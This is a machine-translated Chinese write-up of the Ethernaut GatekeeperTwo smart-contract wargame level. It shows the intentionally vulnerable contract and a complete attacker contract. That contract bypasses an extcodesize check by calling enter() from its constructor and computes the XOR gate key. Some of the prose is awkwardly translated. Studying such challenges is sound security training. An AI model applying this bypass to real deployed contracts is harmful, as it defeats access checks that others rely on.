# 以太人:GatekeeperTwo

> 原文：<https://medium.com/coinmonks/ethernaut-gatekeepertwo-fce56f52f527?source=collection_archive---------47----------------------->

![](img/fbff93a7b66da5d08b9ead1c9851130a.png)

这个把关者带来了一些新的挑战。注册成为参赛者通过这一关。

可能有帮助的事情:

1.  第二个入口中的 assembly 关键字允许一个契约访问非 vanilla Solidity 固有的功能。更多信息见[此处](http://solidity.readthedocs.io/en/v0.4.23/assembly.html)。这个 gate 中的 extcodesize 调用将获得给定地址的合同代码的大小——你可以在[黄皮书](https://ethereum.github.io/yellowpaper/paper.pdf)的第 7 节中了解更多关于如何以及何时设置的信息。
2.  第三个门中的^字符是一个位运算(XOR)，在这里用于应用另一个常见的位运算。

**问题陈述:**为了打败这个关卡，你必须设置**进入者**的值，这是 GatekeeperTwo 契约中的一个公共状态变量。该值只能通过 **enter(bytes8 _gateKey)** 功能设置。这个函数有 3 个修饰符，必须传递它们，然后 entrant 的值才能按预期设置。

> *修饰符 gateOne(): msg.sender！= tx.origin*
> 
> *修饰符 gate two():extcodesize(caller())= = 0*
> 
> *修饰符 gateThree():求 _gateKey 的值，使得按位运算 XOR 的结果必须为 uint64(0) — 1*

**问题合同:**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

**解决方案:**

1.  通过创建一个 AttackGateKeeperTwo 契约，并从该契约调用 **enter** 函数，可以很容易地传递修饰符 gateOne()。这确保了 tx.origin 是 EOA(外部拥有的帐户)，而 msg.sender 是 AttackGateKeeperTwo 合同的地址。因此，require 语句 msg.sender！= tx.origin 成功通过。
2.  修饰符 gateTwo()若要成功执行，协定的代码大小必须为 0。你可能会想这是如何实现的？我们从 AttackGateKeeperTwo 契约调用 **enter** 这个契约确实有代码附加在它上面，所以它的代码大小将是非零的)，你可能会得出一个结论，我们永远无法绕过修饰符 gateTwo()，然而，事实并非如此。这就是坚固性的微妙之处，正如以太坊黄皮书 *的第 [7 节所述，“在初始化代码执行期间，地址上的 EXTCODESIZE 应该返回零。”](https://ethereum.github.io/yellowpaper/paper.pdf)*因此，通过利用这种微妙性，我们从 AttackGateKeeperTwo 的构造函数调用 **enter** ，因为在此期间，契约的代码大小返回 0。这样，我们也绕过了修饰词 gateTwo()。
3.  修饰符 gateThree()必须是。这是通过下面的**实现的，因为^ b = c 意味着^c = b。在我们的例子中,‘b’是‘gate key’**

[attacketekeeperter 关于林克由](https://rinkeby.etherscan.io/address/0x55de3348c0a9c6ad8006E11172b6a8e3b6a9F0ae#code)的两个合同:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackGateKeeperTwo {
    GatekeeperTwo gTwo = GatekeeperTwo("GateKeeperTwo Deployed Address");
    event GateTwoCompromised(address who, uint256 timestamp);
    /**
    * modifierOne will be passed as tx.origin = EOA and msg.sender = address(this)
    * modifierTwo will be passed as during contract construction the extcodesize is 0
    *               Reference from YellowPaper: During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account.
    * modifirerThree do calculation inside the constructor and pass it as gateKey
    */
    constructor() public {
        // GatekeeperTwo's enter function must be called from here
        // Since a ^ b = c implies a ^c = b. In our case `b` is `gateKey`
        bytes8 gateKey = bytes8((uint64(0) - 1)) ^ bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gTwo.enter(gateKey);
        emit GateTwoCompromised(address(this), block.timestamp);

    }
}
```

**安全外卖:**

1.  在初始化期间，检查地址的代码大小可以为零。

如果你从这篇文章中学到了什么，请分享并关注更多这样的内容。

*原载于*[*https://www.linkedin.com*](https://www.linkedin.com/pulse/ethernaut-gatekeepertwo-balaji-shetty-pachai/)*。*

> 交易新手？尝试[加密交易机器人](/coinmonks/crypto-trading-bot-c2ffce8acb2a)或[复制交易](/coinmonks/top-10-crypto-copy-trading-platforms-for-beginners-d0c37c7d698c)